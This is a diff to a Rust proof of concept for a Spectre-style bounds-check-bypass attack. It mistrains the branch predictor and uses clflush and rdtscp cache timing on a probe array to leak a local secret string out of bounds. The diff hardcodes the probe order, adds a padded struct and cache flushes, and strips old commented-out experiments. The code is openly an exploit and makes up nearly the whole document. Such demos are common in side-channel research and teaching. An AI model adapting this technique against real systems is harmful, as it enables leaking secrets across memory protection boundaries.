@@ -1,6 +1,7 @@
 use rand::seq::SliceRandom;
 use std::arch::asm;
 use std::arch::x86_64::*;
+use rand::Rng;
 
 const NUM_TRIES: u64 = 1000;
 const TRAINING_LOOPS: usize = 100;
@@ -33,9 +34,10 @@ fn init_attack() -> (Vec<bool>, Vec<u8>) {
         is_attack[i as usize] = true;
     }
 
-    let mut attack_pattern: Vec<u8> = (0..=255).collect();
+    let mut attack_pattern: Vec<u8> = // (0..=255).collect();
+       vec! [133u8, 211, 224, 148, 141, 69, 183, 14, 76, 90, 37, 52, 94, 26, 46, 250, 41, 220, 237, 143, 156, 111, 166, 201, 36, 81, 104, 89, 96, 255, 182, 22, 64, 47, 87, 209, 225, 142, 151, 226, 219, 152, 126, 130, 106, 178, 186, 221, 17, 158, 125, 150, 20, 79, 243, 160, 167, 101, 249, 71, 51, 247, 124, 213, 222, 44, 5, 48, 193, 231, 212, 132, 55, 215, 176, 109, 240, 218, 206, 177, 164, 63, 82, 173, 61, 252, 4, 103, 154, 175, 59, 197, 199, 99, 146, 1, 241, 122, 74, 30, 159, 188, 242, 138, 93, 6, 129, 134, 181, 140, 123, 18, 229, 187, 162, 163, 80, 202, 29, 203, 38, 73, 185, 60, 13, 194, 190, 184, 62, 214, 161, 95, 196, 0, 21, 58, 53, 239, 227, 169, 149, 34, 45, 43, 165, 248, 200, 195, 8, 136, 98, 253, 144, 192, 121, 11, 9, 170, 15, 35, 57, 147, 23, 216, 65, 28, 157, 85, 107, 232, 174, 88, 16, 223, 67, 135, 25, 112, 86, 97, 7, 155, 208, 145, 70, 168, 246, 230, 72, 10, 210, 31, 27, 40, 2, 245, 233, 205, 12, 128, 75, 33, 102, 172, 153, 139, 198, 39, 131, 100, 191, 118, 179, 254, 84, 3, 207, 77, 19, 92, 32, 113, 228, 91, 78, 244, 171, 120, 114, 105, 235, 110, 251, 83, 180, 236, 49, 217, 204, 24, 115, 117, 54, 127, 238, 119, 108, 66, 189, 234, 68, 116, 137, 42, 56, 50];
     let mut rng = rand::thread_rng();
-    attack_pattern.shuffle(&mut rng);
+    // attack_pattern.shuffle(&mut rng);
 
     println!("is_attack = {:?}", is_attack);
     println!("attack_pattern = {:?}", attack_pattern);
@@ -44,25 +46,25 @@ fn init_attack() -> (Vec<bool>, Vec<u8>) {
 }
 
 #[inline(never)]
-fn fetch_function(arr1: &[u8], arr1_len: &mut usize, arr2: &[u8], idx: usize) -> u8
+pub fn fetch_function(arr1: &Vec<u8>, arr1_len: &mut usize, arr2: &[u8], idx: usize) -> u8
 {
     // This function simulates the behavior of the C++ `fetch_function`.
     // It returns values from the shared memory, based on the `idx`.
 
     let mut val: usize = 0;
-    let arr1_ptr = arr1.as_ptr();
+    // let arr1_ptr = arr1.as_ptr();
 
     if idx < *arr1_len
     {
-      unsafe { val = *arr1_ptr.add(idx) as usize; }
-      // val = arr1[idx] as usize;
+      // unsafe { val = *arr1_ptr.add(idx) as usize; }
+      val = arr1[idx] as usize;
       return arr2[val * 512]
     }
     0
 }
 
 #[inline(never)]
-pub fn read_memory_byte(target_idx: usize, is_attack: &Vec<bool>, arr1: &[u8], arr1_len: &mut usize, arr2: &mut [u8], attack_pattern: &Vec<u8>, results: &mut [u32], idx: usize) -> u8 {
+pub fn read_memory_byte(target_idx: usize, is_attack: &Vec<bool>, arr1: &Vec<u8>, arr1_len: &mut usize, arr2: &mut [u8], attack_pattern: &Vec<u8>, results: &mut [u32], idx: usize) -> u8 {
 
     let mut sum: u8 = 0;
 
@@ -92,6 +94,9 @@ pub fn read_memory_byte(target_idx: usize, is_attack: &Vec<bool>, arr1: &[u8], a
           let merged_idx = (is_attack[i] as usize) * target_idx + (!is_attack[i] as usize) * train_idx;
           // println!("target address = {:#02x}", arr1.as_ptr() as usize + merged_idx);
 
+          unsafe { _mm_clflush(arr1 as *const Vec<u8> as *const usize as *const u8); }
+          unsafe { _mm_mfence(); }
+
           /* Call the victim function with the training_x (to mistrain branch predictor) or target_x (to attack the SECRET address) */
           sum = fetch_function(arr1, arr1_len, arr2, merged_idx) - sum;
         }
@@ -119,9 +124,33 @@ pub fn read_memory_byte(target_idx: usize, is_attack: &Vec<bool>, arr1: &[u8], a
 }
 
 
+struct HackData {
+  arr1: [u8; 16],
+  pad1: [u8; 64],
+  secret: [u8; 20],
+  pad2: [u8; 64],
+  arr2: [u8; 256 * 512],
+  pad3: [u8; 64],
+  arr1_len: usize, 
+  pad4: [u8; 64],
+}
+
+
 fn main() {
 
-    let mut arr1: [u8; 16] = [17, 8, 24, 14, 3, 28, 6, 19, 9, 25, 11, 30, 5, 20, 16, 2];
+    let mut hackdata = HackData {
+      arr1: [17, 8, 24, 14, 3, 28, 6, 19, 9, 25, 11, 30, 5, 20, 16, 2],
+      pad1: [0; 64],
+      secret: [72, 101, 108, 108, 111, 32, 87, 111, 114, 108, 100, 32, 72, 101, 108, 108, 111, 32, 32, 32],
+      pad2: [0; 64],
+      arr2: [0; 256 * 512],
+      pad3: [0; 64],
+      arr1_len: 16,
+      pad4: [0; 64],
+    };
+
+    // let mut arr1: [u8; 16] = [17, 8, 24, 14, 3, 28, 6, 19, 9, 25, 11, 30, 5, 20, 16, 2];
+    let mut arr1 = vec! [17u8, 8, 24, 14, 3, 28, 6, 19, 9, 25, 11, 30, 5, 20, 16, 2];
     let mut secret: [u8; 20] = [72, 101, 108, 108, 111, 32, 87, 111, 114, 108, 100, 32, 72, 101, 108, 108, 111, 32, 32, 32];
 
     let count1 = rdtscp();
@@ -133,7 +162,6 @@ fn main() {
     let mut arr2: [u8; 256 * 512] = [0; 256 * 512]; // Placeholder, initialize with appropriate values
     let mut results: [u32; 256] = [0; 256];
     let mut target_idx: usize;
-    let mut arr1_len: usize = arr1.len();
 
     unsafe {
         target_idx = (secret.as_ptr().offset_from(arr1.as_ptr())) as usize; /* Its value is the difference in the address of SECRET KEY and arr1*/
@@ -147,6 +175,11 @@ fn main() {
     for i in 0..arr2.len() {
         arr2[i] = 1; /* write to arr2 so in RAM not copy-on-write zero pages */
     }
+
+    // create an unknown-sized slice of arr1
+    let mut rng = rand::thread_rng();
+    let arr1_slice = &arr1[..((rng.gen::<usize>() % (arr1.len()-1)))+1];
+    let mut arr1_len: usize = arr1_slice.len();
 
     println!("Reading {} bytes from target ::", arr1.len());
     let mut guessed_secret = String::new(); // This will store the most-likely value of the SECRET_KEY overall
@@ -176,189 +209,4 @@ fn main() {
     println!("Guessed secret = {}", guessed_secret);
 
 }
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-/*
-
-// Counter for high-speed timer
-// Donayam's suggestion
-static TIMER_COUNTER: AtomicU64 = AtomicU64::new(0);
-
-fn high_speed_timer() {
-    loop {
-        TIMER_COUNTER.fetch_add(1, Ordering::Relaxed);
-    }
-}
-
-    // Create a separate thread for high-speed timer
-    let timer_thread = thread::spawn(|| high_speed_timer());
-
-    // Terminate the timer thread
-    timer_thread.join().unwrap();
-
-    // Set the CPU affinity for the main thread
-    /* core_affinity::set_for_current(core_affinity::get(core_affinity::CpuSet::new(0)).unwrap()); */
-
-*/
-
-
-    // let time_start = rdtscp();
-    // for _ in (1..1000) {
-    //  unsafe { _mm_clflush(&arr2[0]); }
-    //  sum = arr2[0] - sum;
-    // }
-    // let time_diff = rdtscp() - time_start;
-    // println!("Average time with clflush: {}", (time_diff as f64)/(1000 as f64));
-
-
-    // let time_start = rdtscp();
-    // for _ in (1..1000) {
-    //  unsafe { _mm_prefetch(&(arr2[0] as i8), _MM_HINT_T0); }
-    //  sum = arr2[0] - sum;
-    // }
-    // let time_diff = rdtscp() - time_start;
-    // println!("Average time without clflush: {}", (time_diff as f64)/(1000 as f64));
-
-/*
-#[inline(always)]
-fn rdtsc() -> u64 {
-    let mut now: u64 = 0;
-    let mut aux: u32 = 0;
-    // let high: u32;
-    // let low: u32;
-    unsafe {
-        // asm!("rdtscp", out("eax") low, out("edx") high);
-        now = core::arch::x86_64::__rdtscp(&mut aux);
-    }
-    // (high as u64) << 32 | low as u64
-    now
-}
-*/
-
-/*
-#[inline(always)]
-unsafe fn clflush(addr: *const u8) {
-    asm!("clflush {0}", in(reg) addr);
-}
-*/
-
-/*
-
-        for i in (0..TRAINING_LOOPS).rev() {
-            // Flush arr1_size from cache memory
-            unsafe {
-                clflush(&arr1_size as *const usize as *const u8);
-            }
-
-            // Add in-between delay cycles
-            for _ in 0..INBETWEEN_DELAY {
-                // You can implement a delay mechanism here
-            }
-
-            let idx = if is_attack[i as usize] {
-                target_idx
-            } else {
-                train_idx
-            };
-
-            // Call the victim function with the training_x (to mistrain branch predictor) or target_x (to attack the SECRET address)
-            fetch_function(&arr1, &arr2, idx, &mut results);
-
-            // Implement the timing attack logic here to measure cache access times for each character and update the `results` array
-        }
-
-        // Calculate the most likely character based on the results array and push it into the secret string
-        let mut most_likely_char = '?';
-        for i in (0..256).rev() {
-            let curr_char = attack_pattern[i as usize];
-            if u64::from(results[curr_char as usize]) >= LIKELY_THRESHOLD {
-                if curr_char >= 31 && curr_char <= 127 {
-                    most_likely_char = curr_char as char;
-                    break;
-                }
-            }
-        }
-        secret.push(most_likely_char as char);
-*/
-
-    // let arr1_size = arr1.len();
-    // let target_idx = SECRET.as_ptr() as usize - arr1.as_ptr() as usize;
-    // let guessed_secret = read_memory_byte(target_idx, arr1_len, is_attack, &arr1, &arr2, attack_pattern);
-    // println!("THE GUESSED SECRET IS :: {}", guessed_secret);
-
-
-        // fetch one line
-        // unsafe { _mm_prefetch(&(arr2[idx * 512] as i8), _MM_HINT_T0); }
-        // sum = arr2[idx * 512] - sum;
-        // sum = arr2[idx * 512] / sum;
-        // sum = arr2[idx * 512] - sum;
-
-/*
-fn fetch_function(arr1: &[u8], arr2: &[u8], idx: usize, results: &mut [u32; 256]) {
-    // This function simulates the behavior of the C++ `fetch_function`.
-    // It returns values from the shared memory, based on the `idx`.
-
-    if idx < arr1.len() {
-        // Ensure the index is within bounds of arr1_size
-        let arr1_idx = arr1[idx] as usize;
-        if arr1_idx < arr2.len() / 512 {
-            // Calculate the index for arr2 based on arr1
-            let arr2_idx = arr1_idx * 512;
-            
-            // Simulate cache access time measurement (you may need to adjust this)
-            let mut time1: u64 = 0;
-            let mut time2: u64 = 0;
-            let junk: u64 = 0;
-            
-            /*
-            unsafe {
-                asm!(
-                    "lfence",
-                    "rdtscp",
-                    "mov {}, rax",
-                    "clflush [$0]",
-                    "rdtscp",
-                    "mov {}, rax",
-                    "lfence",
-                    out(reg) time1 => _,
-                    in(reg) arr2_idx => _,
-                    out(reg) junk => _,
-                    out(reg) time2 => _,
-                );
-            }
-            */
-            
-            if time2 - time1 <= CACHE_HIT_THRESHOLD {
-                // Cache hit, update the results
-                results[arr2[arr2_idx] as usize] += 1;
-            }
-        }
-    }
-}
-*/
-
-    // use rand::Rng;
-
-    // let mut rng = rand::thread_rng();
-    // for i in (0..blast_array.len()).step_by(32) {
-    //   blast_array[i] = rng.gen();
-    // }
-
-    // let mut blast_array: [u8; 128*1024] = [0; 128*1024];
-
-        // for i in (0..blast_array.len()).step_by(16) {
-        //   sum = blast_array[i] - sum;
-        // }
 
